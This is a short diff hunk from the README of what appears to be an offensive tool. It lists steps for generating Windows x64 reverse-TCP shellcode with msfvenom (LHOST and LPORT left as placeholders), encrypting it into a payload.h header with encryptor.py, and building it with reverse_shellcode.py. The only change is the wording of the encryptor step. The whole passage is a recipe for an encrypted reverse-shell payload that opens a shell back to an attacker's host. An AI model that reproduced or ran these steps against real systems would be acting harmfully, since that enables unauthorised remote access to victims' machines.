@@ -20,7 +20,7 @@ Generate your shellcode with msfvenom tool :
 
  * msfvenom -p windows/x64/custom/reverse_tcp LHOST<IP> LPORT<PORT> -f raw -o payload.bin
 
-* py3 encryptor.py — python3 encryptor.py payload.bin
+* py3 encryptor.py payload.bin > produces payload.h
 
 * py3 reverse_shellcode.py --header payload.h
 
